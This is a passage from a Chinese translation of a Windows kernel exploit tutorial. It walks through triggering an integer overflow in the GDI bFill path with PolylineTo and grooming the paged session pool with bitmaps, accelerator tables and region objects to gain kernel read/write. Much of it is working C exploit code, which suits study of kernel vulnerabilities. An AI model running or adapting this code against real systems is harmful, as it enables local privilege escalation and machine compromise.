但是，人们会想当然的认为，可以直接从里面拿到一个伟大的指南，但实际上根本不是这样。虽然这篇文章真的很有助于利用思路。但真正的价值是，对于一对不同的利用，和我这样一个根本没有内核开发和内核利用经验的人，我不得不深入到利用过程中的每个方面，并了解它的工作原理。就是说——“授人以鱼不如授人以渔”
我们继续，那个值是PATH对象中的point数，并且可以通过多次调用PolylineTo函数来控制。触发50字节分配的代码是：
    //Create a Point array 
    static POINT points[0x3fe01];
    // Get Device context of desktop hwnd
    HDC hdc = GetDC(NULL);
    // Get a compatible Device Context to assign Bitmap to
    HDC hMemDC = CreateCompatibleDC(hdc);
    // Create Bitmap Object
    HGDIOBJ bitmap = CreateBitmap(0x5a, 0x1f, 1, 32, NULL);
    // Select the Bitmap into the Compatible DC
    HGDIOBJ bitobj = (HGDIOBJ)SelectObject(hMemDC, bitmap);
    //Begin path
    BeginPath(hMemDC);
    // Calling PolylineTo 0x156 times with PolylineTo points of size 0x3fe01.
    for (int j = 0; j < 0x156; j++) {
        PolylineTo(hMemDC, points, 0x3FE01);
        }
    }
    // End the path
    EndPath(hMemDC);
    // Fill the path
    FillPath(hMemDC);
通过以point数0x3FE01调用PolylineTo函数0x156次将产生
    0x156 * 0x3FE01 = 0x5555556
注意，这个数字小于前面计算产生的数字，原因是实际中当该位左移4位时，最低的半字节将被移出32位寄存器，而剩下的是小数。另一件值得一提的是，应用程序将向point列表中添加一个额外的point，因此传递给溢出指令的数字将为0x5555557。让我们计算一下，看看它会如何工作。
    0x5555557 * 0x3 = 0x10000005 
    0x10000005 << 4 = 0x00000050
到那时候，将会分配50字节大小，应用程序将尝试复制0x5555557大小的数据到那一小块内存，这将迅速导致一个蓝屏，并且我们成功的触发了漏洞！
**Step 3 – 内核内存池Feng Shui:**
现在开始困难的部分：内核池风水
内核池风水是一种用于控制内存布局的技术，通过分配和释放内存的调用在目标对象分配之前，先使内存处于确定的状态。这种想法是想要强制我们的目标对象分配在我们可控对象的附近，然后溢出相邻的对象并使用发生溢出的对象来利用内存破坏原语（译注：所谓的“内存破坏原语”，指的应该是一些可以被利用的指令，比如mov
[eax],xxx 可以进行写），获得读/写内核内存的能力。我选择的对象是Bitmap，具有池标签Gh05（pool
tag），他会被分配给相同的页会话池，并且可以使用SetBitmapBits/GetBitmapBits来控制写/读到任意位置。
发生崩溃是因为在bFill函数结束时，会释放分配的对象，当对象被释放时，内核会验证内存池中相邻块的块头部。如果它被损坏，将抛出错误BAD_POOL_HEADER并退出。由于我们溢出了相邻的页面，所以这个检查将会失败，并且会发生蓝屏。
避开这个检查导致的崩溃的窍门是强制我们的对象分配在内存页的结尾。这样，将不会有下一个块，并且对free（）的调用将正常传递。要实现这个FengShui需要记住以下几点：
内核池页面大小为0x1000字节，任何更大的分配将分配到大内核池（Large kernel Pool）。
任何大于0x808字节的分配都会被分配到内存页的开始。
后续分配将从内存页末尾开始分配。
分配需要相同的池类型，在我们的情况下是分页会话池（Paged）。
分配对象通常会添加大小为0x10的池头。 如果分配的对象是0x50，分配器将实际分配0x60，包括池头。
有了这些，就可以开发内核池风水了，来看看这将如何工作，看看漏洞代码：
    void fungshuei() {
        HBITMAP bmp;
        // Allocating 5000 Bitmaps of size 0xf80 leaving 0x80 space at end of page.
        for (int k = 0; k < 5000; k++) {
            bmp = CreateBitmap(1670, 2, 1, 8, NULL); // 1670  = 0xf80 1685 = 0xf90 allocation size 0xfa0
            bitmaps[k] = bmp;
        }
        HACCEL hAccel, hAccel2;
        LPACCEL lpAccel;
        // Initial setup for pool fengshui.  
        lpAccel = (LPACCEL)malloc(sizeof(ACCEL));
        SecureZeroMemory(lpAccel, sizeof(ACCEL));
        // Allocating  7000 accelerator tables of size 0x40 0x40 *2 = 0x80 filling in the space at end of page.
        HACCEL *pAccels = (HACCEL *)malloc(sizeof(HACCEL) * 7000);
        HACCEL *pAccels2 = (HACCEL *)malloc(sizeof(HACCEL) * 7000);
        for (INT i = 0; i < 7000; i++) {
            hAccel = CreateAcceleratorTableA(lpAccel, 1);
            hAccel2 = CreateAcceleratorTableW(lpAccel, 1);
            pAccels[i] = hAccel;
            pAccels2[i] = hAccel2;
        }
        // Delete the allocated bitmaps to free space at beginning of pages
    for (int k = 0; k < 5000; k++) {
            DeleteObject(bitmaps[k]);
        }
        //allocate Gh04 5000 region objects of size 0xbc0 which will reuse the free-ed bitmaps memory.
        for (int k = 0; k < 5000; k++) {
            CreateEllipticRgn(0x79, 0x79, 1, 1); //size = 0xbc0
        }
        // Allocate Gh05 5000 bitmaps which would be adjacent to the Gh04 objects previously allocated
        for (int k = 0; k < 5000; k++) {
            bmp = CreateBitmap(0x52, 1, 1, 32, NULL); //size  = 3c0
            bitmaps[k] = bmp;
        }
        // Allocate 1700 clipboard objects of size 0x60 to fill any free memory locations of size 0x60
        for (int k = 0; k < 1700; k++) { //1500
            AllocateClipBoard2(0x30);
        }
        // delete 2000 of the allocated accelerator tables to make holes at the end of the page in our spray.
        for (int k = 2000; k < 4000; k++) {
            DestroyAcceleratorTable(pAccels[k]);
            DestroyAcceleratorTable(pAccels2[k]);
        }
    }
可以清楚地看到分配/解除分配的流量，GIF值得一千字
通过分配/释放调用，显示实际发生的事情，内核风水的第一步是：
    HBITMAP bmp;
            // Allocating 5000 Bitmaps of size 0xf80 leaving 0x80 space at end of page.
            for (int k = 0; k < 5000; k++) {
                    bmp = CreateBitmap(1670, 2, 1, 8, NULL); 
                    bitmaps[k] = bmp;
            }
从5000个大小为0xf80的Bitmap对象的分配开始。这将最终开始分配新的内存页面，每个页面将以大小为0xf80的Bitmap对象开始，并在页面结尾留下0x80字节的空间。如果想要检查喷射是否工作，我们可以在bFill内调用PALLOCMEM，并使用poolused
0x8
Gh?5来查看分配了多少个位图对象。另一件事是，如何计算提供给CreateBitmap()函数的大小转换为由内核分配的Bitmap对象。其实这只是一个近似的计算，需要不断的尝试和纠错，通过不断的更改位图的大小，并使用poolfind命令查看分配的大小进行修正。
     // Allocating 7000 accelerator tables of size 0x40 0x40 *2 = 0x80 filling in the space at end of page.
            HACCEL *pAccels = (HACCEL *)malloc(sizeof(HACCEL) * 7000);
            HACCEL *pAccels2 = (HACCEL *)malloc(sizeof(HACCEL) * 7000);
            for (INT i = 0; i < 7000; i++) {
                    hAccel = CreateAcceleratorTableA(lpAccel, 1);
                    hAccel2 = CreateAcceleratorTableW(lpAccel, 1);
                    pAccels[i] = hAccel;
                    pAccels2[i] = hAccel2;
            }
然后，分配7000个加速器表对象（Usac）。每个Usac的大小为0x40，因此其中有两个将分配到剩下的0x80字节的内存中。这将填充前面的分配轮次的剩余0x80字节，并完全填充我们的页面（0xf80
+ 80 = 0x1000）。
     // Delete the allocated bitmaps to free space at beginning of pages
            for (int k = 0; k < 5000; k++) {
                    DeleteObject(bitmaps[k]);
            }
下一次分配以前分配的对象将保留有我们的内存页布局，在页的开头有0xf80个空闲字节。
    //allocate Gh04 5000 region objects of size 0xbc0 which will reuse the free-ed bitmaps memory.